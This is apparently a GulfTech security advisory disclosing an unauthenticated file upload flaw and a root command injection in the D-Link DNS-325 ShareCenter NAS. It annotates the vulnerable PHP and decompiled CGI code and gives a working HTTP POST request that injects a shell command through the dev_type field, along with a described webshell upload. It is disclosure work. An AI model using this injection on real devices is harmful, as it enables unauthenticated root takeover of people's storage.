@@ -1,0 +1,369 @@
+D-Link DNS-325 ShareCenter Multiple Vulnerabilities
+
+Vendor: D-Link
+Product: D-Link DNS-325 ShareCenter
+Version: <= 1.05B03
+Website: http://sharecenter.dlink.com/products/DNS-325
+
+
+###########################################################################
+                     ______      ____________          __  
+                    / ____/_  __/ / __/_  __/__  _____/ /_ 
+                   / / __/ / / / / /_  / / / _ \/ ___/ __ \
+                  / /_/ / /_/ / / __/ / / /  __/ /__/ / / /         
+                  \____/\__,_/_/_/   /_/  \___/\___/_/ /_/ 
+                                                                
+                     GulfTech Research and Development                                                                 
+
+###########################################################################
+#     D-Link DNS-325 ShareCenter <= 1.05B03  Multiple Vulnerabilities     #
+###########################################################################
+ 
+
+Released Date: 2017-01-15
+Last Modified: 2017-06-22
+ Company Info: D-Link
+ Version Info: 
+              Vulnerable
+               D-Link DNS-325 ShareCenter <= 1.05B03
+ 
+
+--[ Table of contents
+
+00 - Introduction
+    00.1 Background
+
+01 - Unrestricted File Upload
+    01.1 - Vulnerable code analysis
+    01.2 - Remote exploitation
+
+02 - Command Injection
+    02.1 - Vulnerable code analysis
+    02.2 - Remote exploitation
+
+03 - Credit
+
+04 - Proof of concept
+
+05 - Solution
+
+06 - Contact information
+
+
+--[ 00 - Introduction
+
+The purpose of this article is to detail the research that I have recently 
+completed regarding the D-Link DNS 325 ShareCenter.
+
+--[ 00.1 - Background
+
+D-Link Share Center DNS-325 2-Bay Network Storage Enclosure is an easy to 
+use solution for accessing, sharing and backing up your important data.
+
+
+--[ 01 - Unrestricted file upload
+
+The DNS-325 is vulnerable to the same file upload issue as the DNS-320L. 
+The vulnerable code can be found within the following file:
+
+/usr/local/modules/web/pages/jquery/uploader/multi_uploadify.php
+
+The root of the problem here is due to the misuse and misunderstanding of
+the PHP gethostbyaddr() function used within PHP, by the developer of this 
+particular piece of code. From the PHP manual this functions return values 
+are defined as the following for gethostbyaddr():
+
+"Returns the host name on success, the unmodified ip_address on failure, or 
+FALSE on malformed input."
+
+With a brief overview of the problem, let's have a look 
+at the offending code in order to get a better understanding of what is 
+going on with this particular vulnerability.
+
+--[ 01.1 - Vulnerable code analysis
+
+Below is the code from the vulnerable "multi_uploadify.php" script. You can
+see that we have annoted the code to explain what is happening.
+
+#BUG 01: Here the attacker controlled "Host" header is used to define the 
+remote auth server. This is by itself really bad, as an attacker could
+easily just specify that the host be the IP address of a server that they
+are in control of. But, if we send it an invalid "Host" header it will just
+simply return FALSE as defined in the PHP manual.
+
+$ip = gethostbyaddr($_SERVER['HTTP_HOST']);
+$name = $_REQUEST['name'];
+$pwd = $_REQUEST['pwd'];
+$redirect_uri =  $_REQUEST['redirect_uri']; 
+
+//echo $name ."
+".$pwd."
+".$ip;
+
+#BUG 02: At this point, this request should always fail. The $result
+variable should now be set to FALSE.
+
+$result = @stripslashes( @join( @file( "http://".$ip."/mydlink/mydlink.cgi?
+cmd=1&name=".$name."=&pwd=".$pwd ),"" ));
+
+#BUG 03: Here an empty haystack is searched, and thus strstr() returns a
+value of FALSE.
+
+$result_1 = strstr($result,"0");
+$result_1 = substr ($result_1, 0,28);  
+
+#BUG 04: The strncmp() call here is a strange one. It looks for a specific
+login failure. So, it never accounts for when things go wrong or slightly
+unexpected. As a result this "if" statement will always be skipped.
+
+if (strncmp ($result_1,"0",28) == 0 )
+//if (strstr($result,"0")== 0 )
+{
+    header("HTTP/1.1 302 Found");
+  header("Location: ".$redirect_uri."?status=0");
+  exit();   
+}
+
+#BUG 05: At this point all checks have been passed, and an attacker can use
+this issue to upload any file to the server that they want.
+
+The rest of the source code was omitted for the sake of breivity, but it 
+just handles the file upload logic once the user passes the authentication
+checks.
+
+--[ 01.2 - Remote exploitation
+
+Exploiting this issue to gain a remote shell as root is a rather trivial
+process. All an attacker has to do is send a post request that contains a 
+file to upload using the parameter "Filedata[0]", a location for the file 
+to be upload to which is specified within the "folder" parameter, and of 
+course a bogus "Host" header.
+
+We have written a Metasploit module to exploit this issue. The module will
+use this vulnerability to upload a PHP webshell to the "/var/www/"
+directory. Once uploaded, the webshell can be executed by requesting a URI
+pointing to the backdoor, and thus triggering the payload.
+
+
+--[ 02 - Command Injection
+
+There are a number of issues with the CGI's contained within the DNS-325
+file structure. The issues that we came across over and over were lack of
+authentication, as well as command injection. We will examine one of these
+issues, and leave the others as an excercise to the reader.
+
+
+--[ 02.1 - Vulnerable code analysis
+
+The CGI binary named "photocenter_mgr.cgi" is vulnerable to a very straight 
+forward command injection issue when calling the "cgi_set_airplay_device"
+function.
+
+size_t cgi_set_airplay_device()
+{
+  int v0; // r4@3
+  size_t v1; // r0@3
+  const char *v2; // r0@3
+  FILE *v3; // r5@5
+  char *v4; // r0@6
+  int v5; // r4@7
+  signed int v6; // r6@7
+  size_t result; // r0@13
+  FILE *v8; // r4@11
+  int v9; // [sp+10h] [bp-C84h]@1
+  int v10; // [sp+410h] [bp-884h]@1
+  int v11; // [sp+610h] [bp-684h]@1
+  int v12; // [sp+810h] [bp-484h]@1
+  char s; // [sp+A10h] [bp-284h]@1
+  char v14; // [sp+B10h] [bp-184h]@1
+  char v15; // [sp+B50h] [bp-144h]@1
+  char v16; // [sp+B90h] [bp-104h]@1
+  signed int v17; // [sp+B94h] [bp-100h]@2
+  signed int v18; // [sp+B98h] [bp-FCh]@2
+  signed int v19; // [sp+B9Ch] [bp-F8h]@2
+  int v20; // [sp+BA0h] [bp-F4h]@2
+  __int16 v21; // [sp+BA4h] [bp-F0h]@15
+  char v22; // [sp+BA6h] [bp-EEh]@15
+  char v23; // [sp+BD0h] [bp-C4h]@1
+  char v24; // [sp+C10h] [bp-84h]@1
+  int v25; // [sp+C50h] [bp-44h]@1
+  int v26; // [sp+C54h] [bp-40h]@1
+  char dest[4]; // [sp+C58h] [bp-3Ch]@1
+  int v28; // [sp+C5Ch] [bp-38h]@1
+  int v29; // [sp+C60h] [bp-34h]@1
+  int *v30; // [sp+C64h] [bp-30h]@1
+
+  memset(&s, 0, 0x100u);
+  memset(&v12, 0, 0x200u);
+  memset(&v24, 0, 0x40u);
+  memset(&v23, 0, 0x40u);
+  memset(&v11, 0, 0x200u);
+  v30 = 0;
+  memset(&v9, 0, 0x400u);
+  *(_DWORD *)dest = 0;
+  v28 = 0;
+  memset(&v10, 0, 0x200u);
+  v25 = 0;
+  v26 = 0;
+  memset(&v16, 0, 0x40u);
+  memset(&v15, 0, 0x40u);
+  memset(&v14, 0, 0x40u);
+  cgiFormString("dev_name", &s, 256);
+  cgiFormString("dev_type", &v24, 64);
+  cgiFormString("dev_pw", &v23, 64);
+  cgiFormString("type", &v25, 8);
+  v30 = &v12;
+  v29 = 512;
+  printf_out("dev_name=[%s]\n", &s);
+  printf_out("dev_type=[%s]\n", &v24);
+  printf_out("dev_pw=[%s]\n", &v23);
+  printf_out("type=[%s]\n", &v25);
+  if ( !strcmp((const char *)&v25, "photo") )
+  {
+    LOBYTE(v20) = 0;
+    *(_DWORD *)&v16 = 1886221359;
+    v17 = 1919508783;
+    v18 = 2036427888;
+    v19 = 1819113518;
+  }
+  else
+  {
+    *(_DWORD *)&v16 = 1886221359;
+    v17 = 'ria/';
+    v18 = 2036427888;
+    v19 = 1685414239;
+    v20 = 2016309097;
+    v22 = 0;
+    v21 = 'lm';
+  }
+  v0 = 0;
+  sprintf((char *)&v11, "rm -f %s", &v16);
+  system((const char *)&v11);
+  v1 = strlen(&s);
+  v2 = (const char *)escape_label(&s, v1, &v30, &v29);
+  cgi_api_SpecSymbol2BackSlash((char *)&v9, v2);
+  sprintf((char *)&v11, "airplayer -c connect -d \"%s\" -t \"%s\" %s >/dev/
+  null", &v9, &v24, &v23);
+  printf_out("[%s]\n", &v11);
+  system((const char *)&v11);
+  printf_out("filename[%s]\n", &v16);
+  while ( 1 )
+  {
+    ++v0;
+    v3 = (FILE *)fopen64(&v16, "r");
+    if ( v3 )
+      break;
+    printf_out("wait[%d]\n");
+    sleep(1u);
+    if ( v0 == 30 )
+    {
+      v6 = (signed int)v3;
+      goto LABEL_9;
+    }
+  }
+  fgets(&v15, 512, v3);
+  fgets(&v15, 512, v3);
+  fgets(&v15, 512, v3);
+  fgets(&v14, 512, v3);
+  v4 = index(&v14, 62);
+  if ( v4 )
+  {
+    v5 = (int)(v4 + 1);
+    v6 = 1;
+    *index(v4 + 1, 60) = 0;
+    strcpy(dest, v4 + 1);
+    printf_out("res[%s]\n", v5);
+  }
+  else
+  {
+    v6 = 0;
+  }
+  fclose(v3);
+LABEL_9:
+  sprintf(&v16, "/var/www/xml/airplay_info_%s.xml", &v25);
+  if ( dest[0] == 48 && !dest[1] )
+  {
+    v8 = (FILE *)fopen64(&v16, "w+");
+    fwrite("", 1u, 0x26u, v8);
+    sprintf(
+      (char *)&v10,
+      "%s",
+      &s,
+      &v24,
+      &v23);
+    fputs((const char *)&v10, v8);
+    fclose(v8);
+  }
+  cgiHeaderContentType("text/xml");
+  fwrite("", 1u, 0x26u, (FILE *)
+  cgiOut);
+  if ( v6 == 1 )
+  {
+    result = fprintf((FILE *)cgiOut, "%s", 
+    dest);
+  }
+  else
+  {
+    system("kill `pidof airplay_daemon`");
+    result = fwrite("timeout", 1u, 0x25u, 
+    (FILE *)cgiOut);
+  }
+  return result;
+}
+
+As we can see in the above psuedo code parameters taken from form input are
+use directly within a system call without being sanitized. This can be 
+leveraged by an attacker to execute arbitrary commands as root. 
+Authentication is not required to exploit this issue.
+
+--[ 02.2 - Remote exploitation
+
+Exploiting this issue is trivial. Authentication is not required to 
+successfully exploit this issue and gain a remote root shell.
+
+
+POST /cgi-bin/photocenter_mgr.cgi HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+
+cmd=cgi_set_airplay_device&dev_type=1";touch /tmp/gulftech;"
+
+
+Simply sending a post request like the one above will successfully create a
+file named "gulftech" in the /tmp directory as root.
+
+--[ 03 - Credit
+
+James Bercegay
+GulfTech Research and Development
+
+
+--[ 04 - Proof of concept
+
+We strive to do our part to contribute to the security community.
+Metasploit modules for issues outlined in this paper can be found online.
+
+
+--[ 05 - Solution
+
+D-Link were notified of these issues June of last year. No update has been
+released publicly.
+
+
+--[ 06 - Contact information
+
+Web
+https://gulftech.org/
+
+Mail
+security@gulftech.org
+
+
+Copyright 2018 GulfTech Research and Development. All rights reserved.
